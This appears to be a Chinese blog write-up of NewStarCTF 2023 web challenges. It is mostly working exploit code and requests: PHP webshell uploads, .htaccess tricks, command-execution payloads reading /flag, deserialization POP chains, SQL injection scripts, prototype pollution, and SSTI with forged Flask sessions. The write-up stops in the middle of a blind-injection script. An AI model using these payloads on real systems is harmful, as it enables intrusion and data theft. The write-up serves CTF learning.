+++
title = "NewStarCTF 2023 公开赛道"
slug = "newstarctf-2023-public-track"
description = "依旧放松，不对劲，好像并不放松"
date = "2025-08-08T21:00:15"
lastmod = "2025-08-08T21:00:15"
image = ""
license = ""
categories = ["复现"]
tags = ["php", "ssti", "phar", "nodejs", "mysql"]
+++

## 泄漏的秘密

访问`www.zip`

```python
flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
```

## Begin of Upload

```js
    <script type="text/javascript">
        function validateForm() {
            var fileInput = document.getElementById("file");
            var file = fileInput.files[0];
            var allowedExtensions = ["jpg", "jpeg", "png", "gif"];
            var fileExtension = file.name.split('.').pop().toLowerCase();
            
            if (!file) {
                alert("Please select a file to upload.");
                return false;
            }
            
            if (!allowedExtensions.includes(fileExtension)) {
                alert("错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF");
                return false;
            }
            
            return true;
        }
    </script>
```

这里的拓展名是包含即可不会管位置

```http
POST / HTTP/1.1
Host: 41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81
Content-Length: 307
Cache-Control: max-age=0
Origin: http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysNiLt38cRoeUSc87
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close

------WebKitFormBoundarysNiLt38cRoeUSc87
Content-Disposition: form-data; name="file"; filename="1.jpg.php"
Content-Type: image/jpeg

<?php eval($_POST[1]);
------WebKitFormBoundarysNiLt38cRoeUSc87
Content-Disposition: form-data; name="submit"

Upload!!!
------WebKitFormBoundarysNiLt38cRoeUSc87--

```

## Begin of HTTP

```http
POST /?ctf=1 HTTP/1.1
Host: node5.buuoj.cn:27312
Cache-Control: max-age=0
User-Agent: NewStarCTF2023
Referer: newstarctf.com
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
X-Real-IP: 127.0.0.1
Cookie: power=ctfer
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

secret=n3wst4rCTF2023g00000d
```

## ErrorFlask

测试不是SSTI，报错出了flag

```
?number1=1&number2=3=1
```

![](PixPin_2025-08-08_21-15-24.png)

## Begin of PHP

经典的弱比较问题

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```

放点资料，就不说了

```
$md5 						md5($md5)
s878926199a					0e545993274517709034328855841020
s155964671a					0e342768416822451524974117254469
s214587387a					0e848240448830537924465865611904
s214587387a					0e848240448830537924465865611904
s878926199a					0e545993274517709034328855841020
s1091221200a					0e940624217856561557816327384675
s1885207154a					0e509367213418206700842008763514
s1502113478a					0e861580163291561247404381396064
s1885207154a					0e509367213418206700842008763514
s1836677006a					0e481036490867661113260034900752
s155964671a					0e342768416822451524974117254469
s1184209335a					0e072485820392773389523109082030
s1665632922a					0e731198061491163073197128363787
s1502113478a					0e861580163291561247404381396064
s1836677006a					0e481036490867661113260034900752
s1091221200a					0e940624217856561557816327384675
s155964671a					0e342768416822451524974117254469
s1502113478a					0e861580163291561247404381396064
s155964671a					0e342768416822451524974117254469
s1665632922a					0e731198061491163073197128363787
s155964671a					0e342768416822451524974117254469
s1091221200a					0e940624217856561557816327384675
s1836677006a					0e481036490867661113260034900752
s1885207154a					0e509367213418206700842008763514
s532378020a					0e220463095855511507588041205815
s878926199a					0e545993274517709034328855841020
s1091221200a					0e940624217856561557816327384675
s214587387a					0e848240448830537924465865611904
s1502113478a					0e861580163291561247404381396064
s1091221200a					0e940624217856561557816327384675
s1665632922a					0e731198061491163073197128363787
s1885207154a					0e509367213418206700842008763514
s1836677006a					0e481036490867661113260034900752
s1665632922a					0e731198061491163073197128363787
s878926199a					0e545993274517709034328855841020
QNKCDZO						0e830400451993494058024219903391
```

```http
POST /?key1=s878926199a&key2=s155964671a&key4[]=1&key5=2024a HTTP/1.1
Host: d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81
Referer: http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81/?key1=s878926199a&key2=s155964671a&key4[]=1&key5=2024a
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Pragma: no-cache
Origin: http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81
Content-Length: 20

key3%5B%5D=1&flag5=+
```

## R!C!E!

依旧经典

```php
<?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
}
```

过了md5就可以RCE

```python
import hashlib
for i in range(100000000):
    s = str(i)
    h = hashlib.md5(s.encode()).hexdigest()
    if h.startswith('c4d038'):
        print(s, h)
        break

```

```
password=114514&&e[v.a.l=echo `tac /f*`;
```

## EasyLogin

```python
with open('passwords.txt', 'r', encoding='utf-8') as f:
    pwds = [line.strip() for line in f]
with open('passwords_md5.txt', 'w', encoding='utf-8') as f:
    for pwd in pwds:
        import hashlib
        md5val = hashlib.md5(pwd.encode()).hexdigest()
        f.write(md5val+'\n')

```

```http
POST /signin.php HTTP/1.1
Host: node5.buuoj.cn:27475
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: http://node5.buuoj.cn:27475
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: power=hacker; token=
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node5.buuoj.cn:27475/signin.php
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Content-Length: 50

un=admin&pw={{file:line(D:\Burpsuite\密码合集\passwords_md5.txt)}}&rem=0
```

登录进去之后没什么用，爆破出来是`admin\000000`，登录的时候抓包获得了flag

```http
POST /passport/9963b7428698fdf50f4c66c7db8ff8e113c5b1e47244da406411476e536259f1.php HTTP/1.1
Host: node5.buuoj.cn:27475
Pragma: no-cache
Accept-Encoding: gzip, deflate
Cookie: power=hacker; token=
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: http://node5.buuoj.cn:27475/signin.php
Origin: http://node5.buuoj.cn:27475
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

passport=OWY1OWM3fGFkbWlufGIxZWE3M3w2NzBiMTQ3MjhhZDk5MDJhZWNiYTMyZTIyZmE0ZjZiZHw5YmY2ZXww
```

## 游戏高手

看了前端的js代码是和后端的php连着的，可以直接控制台给分数然后over就行了

```js
var gameScore=10000000;gameover();
```

但是™的发现出题人根本前后端没分离

```http
POST /api.php HTTP/1.1
Host: 968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81
Accept-Encoding: gzip, deflate
Content-Type: application/json
Referer: http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81/
Accept: */*
Content-Length: 18

{"score":10000000}
```

这样也可以

## include 0。0

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> nope

```

直接用iconv就行了

```
?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php
```

`convert.iconv.*`的使用方式有两种

- 一种是用`.`
- 一种是用`/`

```
convert.iconv.<input-encoding>.<output-encoding> 

convert.iconv.<input-encoding>/<output-encoding>
```

这题里面的就是把文件的字符编码从`UTF-8`转换成`UTF-16`，支持的字符编码有

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-mac (alias: MacJapanese)
SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)
SJIS-Mobile#KDDI (alias: SJIS-KDDI)
SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)
UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)
UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)
ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)
JIS
JIS-ms
CP50220
CP50220raw
CP50221
CP50222
ISO-8859-1*
ISO-8859-2*
ISO-8859-3*
ISO-8859-4*
ISO-8859-5*
ISO-8859-6*
ISO-8859-7*
ISO-8859-8*
ISO-8859-9*
ISO-8859-10*
ISO-8859-13*
ISO-8859-14*
ISO-8859-15*
ISO-8859-16*
byte2be
byte2le
byte4be
byte4le
BASE64
HTML-ENTITIES (alias: HTML)
7bit
8bit
EUC-CN*
CP936
GB18030
HZ
EUC-TW*
CP950
BIG-5*
EUC-KR*
UHC (alias: CP949)
ISO-2022-KR
Windows-1251 (alias: CP1251)
Windows-1252 (alias: CP1252)
CP866 (alias: IBM866)
KOI8-R*
KOI8-U*
ArmSCII-8 (alias: ArmSCII8)
```

门道很深，可以看看陆队的文章

https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/

## ez_sql

简单过滤联合注入即可

```sql
'union sElect 1,2,3,4,5--+

'union sElect 1,2,3,(sElect group_concat(table_name)from mysql.innodb_table_stats),5--+
# grades,here_is_flag,gtid_slave_pos


'union sElect 1,2,3,(sElect group_concat(`1`) from (sElect * from here_is_flag)a),5--+
# 没报错说明没写错，再把flag带出来就行

'union sElect 1,2,3,(sElect group_concat(`3`) from (Select 3 union sElect * from here_is_flag)a),5--+
# 1,flag{bc8317fc-c0b2-489e-879d-111a988aa848}
```

## Unserialize？

```php
<?php
highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    private $cmd;

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

@unserialize($_POST['unser']);
?>
```

```php
<?php
class evil {
    private $cmd;
    function __construct($cmd1){
        $this->cmd=$cmd1;
    }
}

//$a=new evil('ls /');
$a=new evil('head /th1s_1s_fffflllll4444aaaggggg ');
echo urlencode(serialize($a));
?>

```

## Upload again!

上传`.htaccess`就好了

```http
POST / HTTP/1.1
Host: f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypelbI2sZUZHuXDs8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Content-Length: 315

------WebKitFormBoundarypelbI2sZUZHuXDs8
Content-Disposition: form-data; name="file"; filename="poc.jpg"
Content-Type: image/jpeg

PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==
------WebKitFormBoundarypelbI2sZUZHuXDs8
Content-Disposition: form-data; name="submit"

Upload!!!
------WebKitFormBoundarypelbI2sZUZHuXDs8--

```

```
#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
```

## R!!C!!E!!

git恢复之后拿到源码

```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

本地测试可以RCE，

```http
GET /1.php?star=eval(next(getallheaders())); HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
sec-fetch-user: ?1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Cookie: csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Fetch-Mode: navigate
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
User-Agent: system("whoami");
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


```

但是远程就很奇怪了，多了很多本身抓包都没有的http头

```http
GET /bo0g1pop.php?star=eval(next(getallheaders())); HTTP/1.1
Host: 6e7da965-f969-4ad3-81bd-4be5caba6585.node5.buuoj.cn:81
X-Request-ID: system("tac /f*");
Pragma: no-cache
sec-fetch-user: ?1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Cookie: csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Fetch-Mode: navigate
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
User-Agent: system("whoami");
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


```

但是这些请求头又都是可控的，所以赋值就可以R

## medium_sql

这道题有点离谱的是`information`必须写成`infOrmation`不然就不成功。很奇怪

```python
import requests
from tqdm import tqdm

url = "http://f91b90bf-0fac-4211-8ae0-f1c9ca753a60.node5.buuoj.cn:81/?id="
maxlen = 50
target = ""

for i in range(1, maxlen+1):
    found = False
    for mid in tqdm(range(32, 127), desc=f"爆破第{i}位", ncols=70):
        # payload = f"TMP0929'AnD If(Ascii(Mid((database()),{i},1))={mid},1,0)--+"
        # ctf
        # payload = f"TMP0929'AnD If(Ascii(Mid((Select(Group_concat(table_name))From(infOrmation_schema.tables)wHere(Table_schema='ctf')),{i},1))={mid},1,0)--+"
        # here_is_flag,grades
        # payload = f"TMP0929'AnD If(Ascii(Mid((Select(Group_concat(column_name))From(infOrmation_schema.columns)wHere(Table_name='here_is_flag')),{i},1))={mid},1,0)--+"
        # flag
        payload = f"TMP0929'AnD If(Ascii(Mid((Select(flag)From(ctf.here_is_flag)),{i},1))={mid},1,0)--+"

        r = requests.get(url + payload)
        if "TMP0929" in r.text:
            target += chr(mid)
            tqdm.write(f"{i}位: {chr(mid)} 当前: {target}")
            found = True
            break
    if not found:
        break

print("结果:", target)

```

## POP Gadget

他这php版本其实是修饰符不敏感的

```php
<?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']);

```

```
Begin::__destruct -> Then::toString -> Super::__invoke -> Handle::__call -> CTF::end -> WhiteGod::__unset
```

```php
<?php
class Begin {
    public $name;
}
class Then {
    public $func;
}
class Super {
    public $obj;
}
class Handle {
    public $obj;
}
class CTF {
    public $handle;
}
class WhiteGod {
    public $func;
    public $var;
}

$wg = new WhiteGod();
$wg->func = 'system';
$wg->var  = 'cat /flag';

$ctf = new CTF();
$ctf->handle = $wg;

$handle = new Handle();
$handle->obj = $ctf;

$super = new Super();
$super->obj = $handle;

$then = new Then();
$ref = new ReflectionClass('Then');
$prop = $ref->getProperty('func');
$prop->setAccessible(true);
$prop->setValue($then, $super);

$begin = new Begin();
$begin->name = $then;

echo urlencode(serialize($begin));

```

## GenShin

发包找到路由`/secr3tofpop`，发现是SSTI，用webui的fenjing或者是直接攻击这个参数

```powershell
python -m fenjing webui

python -m fenjing crack --url "http://c2e17393-1f82-4896-87bc-94bd454fc77e.node5.buuoj.cn:81/secr3tofpop" --method GET --inputs name --detect-mode fast
```

## OtenkiGirl

没找到可以直接污染RCE的依赖，看看路由

```js
async function getInfo(timestamp) {
    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
    // Remove test data from before the movie was released
    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
    timestamp = Math.max(timestamp, minTimestamp);
    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
    return data;
}
```

在config里面有一个最早允许的时间，和我传入的时间做对比，取大值，再去数据库查询数据，我全局搜索也没有找到返回flag的逻辑，所以应该就是这里了

```js
module.exports = {
    app_name: "OtenkiGirl",
    default_lang: "ja",
    min_public_time: "2019-07-09",
    server_port: 9960,
    webpack_dev_port: 9970
}
```

早于这个时间就可以了，但是必须第一次就成功，由于污染的特性，第二次就会坏了

```http
POST /submit HTTP/1.1
Host: 982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{"contact": "test","reason": "test","__proto__": {"min_public_time": "1001-01-01"}}
```

```python
import requests
url="http://982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81/info/0"
data = {'user':'test','password':'test'}
res=requests.post(url=url,headers={'content-type':'application/x-www-form-urlencoded'}).text
print(res)
```

## InjectMe

> 穿越我的秘密，狠狠的注入

`110.jpg`可以看到部分源码的路由`/download?file=..././..././app.py`得到源码

```python
import os
import re

from flask import Flask, render_template, request, abort, send_file, session, render_template_string
from config import secret_key

app = Flask(__name__)
app.secret_key = secret_key


@app.route('/')
def hello_world():  # put application's code here
    return render_template('index.html')


@app.route("/cancanneed", methods=["GET"])
def cancanneed():
    all_filename = os.listdir('./static/img/')
    filename = request.args.get('file', '')
    if filename:
        return render_template('img.html', filename=filename, all_filename=all_filename)
    else:
        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get('file', '')
    if filename:
        filename = filename.replace('../', '')
        filename = os.path.join('static/img/', filename)
        print(filename)
        if (os.path.exists(filename)) and ("start" not in filename):
            return send_file(filename)
        else:
            abort(500)
    else:
        abort(404)


@app.route('/backdoor', methods=["GET"])
def backdoor():
    try:
        print(session.get("user"))
        if session.get("user") is None:
            session['user'] = "guest"
        name = session.get("user")
        if re.findall(
                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
                name):
            abort(500)
        else:
            return render_template_string(
                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
    except Exception:
        abort(500)


@app.errorhandler(404)
def page_not_find(e):
    return render_template('404.html'), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    app.run('0.0.0.0', port=8080)

```

session中的user会被不正当的渲染，`config.py`里面读取到`y0u_n3ver_k0nw_s3cret_key_1s_newst4r`这个KEY，就可以RCE了

```python
import json
import subprocess
import logging
from fenjing import exec_cmd_payload
logging.basicConfig(level=logging.INFO)

BLACKLIST = [
    "__", "{{", "class", "base", "init", "mro", "subclasses", "builtins", "globals",
    "flag", "os", "system", "popen", "eval", ":", "+", "request", "cat", "tac",
    "base64", "nl", "hex", "\\u", "\\x", "."
]

def waf(s: str) -> bool:
    return all(word not in s for word in BLACKLIST)

def gen_fenjing_payload(cmd: str) -> str:
    payload, _ = exec_cmd_payload(waf, cmd)
    return payload

def gen_signed_cookie(payload: str, secret: str) -> str:
    cookie_json = json.dumps({"user": payload}, ensure_ascii=False)
    proc = subprocess.run(
        ["flask-unsign", "--sign", "--cookie", cookie_json, "--secret", secret],
        capture_output=True, text=True
    )
    if proc.returncode != 0:
        raise RuntimeError(f"flask-unsign failed: {proc.stderr.strip()}")
    return proc.stdout.strip()

if __name__ == "__main__":
    # ssti_payload = gen_fenjing_payload("ls /")
    ssti_payload = gen_fenjing_payload("tac /y0U3_f14g_1s_h3re")
    print("Fenjing payload:")
    print(ssti_payload)

    secret = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
    signed_cookie = gen_signed_cookie(ssti_payload, secret)
    print("\nSigned cookie:")
    print(signed_cookie)


```

```http
GET /backdoor HTTP/1.1
Host: baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81
Pragma: no-cache
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
referer: http://baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81/cancanneed?file=1.jpg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Cookie: session=.eJxdzcEKgkAQBuBXkYH49VRRp96jk8qitdnC6i676yHEnj1_CYMO8zEzP8NMMkYd5CLTzgczpCzPrfFx7EsovNfqAOvaxsbvrFD_whYYjU1m-EuhTO9dSOxQ53BARFGU8IDzelh2laRKKmnIjWRkT17kQK7kRBR5kCM5k24L1l3cxud2FoiuhL-Dbu7L42I3y_wBmNpHmg.aJbi0A.VyZ7WpCdIRqTZl5WzFJtWw4jAfs
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


```

## 逃

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data
```

字符增多的字符串逃逸

```python
print(len('";s:3:"cmd";s:4:"ls /";}'))
print("bad"*24+'";s:3:"cmd";s:4:"ls /";}')
```

```php
<?php
function waf($str){
    return str_replace("bad","good",$str);
}
class GetFlag {
    public $key = 'badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}';
    public $cmd = "whoami";
    public function __destruct()
    {
        system($this->cmd);
    }
}
$AA=new GetFlag();
echo serialize($AA)."\n";
$res=waf(serialize($AA));
echo $res."\n";
$c=unserialize($res);
echo $c->key;
```

## More Fast

```php
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55
```

GC绕过即可

```
Start.__destruct() --> Crypto.__toString() --> Reverse.__get() --> Pwn.__invoke() --> Web.evil() 
```

```php
<?php
class Start{ public $errMsg; }
class Pwn{ public $obj; }
class Reverse{ public $func; }
class Web{ public $func; public $var; }
class Crypto{ public $obj; }

$w = new Web();
$w->func = 'system';
//$w->var  = 'ls /';
$w->var  = 'cat /f*';


$p = new Pwn();
$p->obj = $w;

$r = new Reverse();
$r->func = $p;

$c = new Crypto();
$c->obj = $r;

$s = new Start();
$s->errMsg = $c;

$payload = serialize($s);
echo substr($payload, 0, -1), PHP_EOL;

```

## midsql

```php
$cmd = "select name, price from items where id = ".$_REQUEST["id"];
$result = mysqli_fetch_all($result);
$result = $result[0];
```

没给waf，但是好像没什么waf，不知道有什么黑魔法，第一个字符我用大于小于手动出来是`c`，但是我用等号吧，他又不延时

```python
import requests
import time

url = "http://79972a33-c957-4446-a719-2f9e743e59a8.node5.buuoj.cn:81/"
result = ''
i = 0
DELAY_THRESHOLD=2

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) //2

        # payload = f'''if(ascii(substr(database(),{i},1))>{mid},sleep(2),0)%23'''
        # ctf
        # payload = f"if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),{i},1))>{mid},sleep(2),0)%23"
        # items
        # payload = f"if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like('ctf')and(table_name)like('items')),{i},1))>{mid},sleep(2),0)%23"
        # id,name,price
        # payload = f"if(ascii(substr((select(group_concat(id,name,price))from(items)),{i},1))>{mid},sleep(2),0)%23"
